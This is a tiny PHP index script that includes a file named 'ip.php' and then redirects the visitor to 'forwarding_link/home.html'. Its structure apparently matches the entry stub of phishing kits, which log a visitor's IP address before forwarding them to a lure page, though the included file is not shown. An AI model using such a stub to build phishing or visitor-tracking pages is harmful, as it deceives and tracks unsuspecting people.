<?php
include 'ip.php';
header('Location: forwarding_link/home.html');
exit
?>
